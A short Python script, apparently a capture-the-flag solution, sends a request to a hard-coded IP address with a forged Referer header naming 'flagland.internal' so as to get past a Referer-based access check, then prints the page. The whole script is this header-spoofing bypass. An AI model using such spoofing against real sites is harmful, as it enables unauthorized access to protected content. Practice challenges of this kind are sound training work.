import requests

url = "http://18.184.219.56:8080/"

s = requests.Session()

headers = {"referer": "http://flagland.internal/"}

r = s.get(url, headers=headers)

print(r.text)
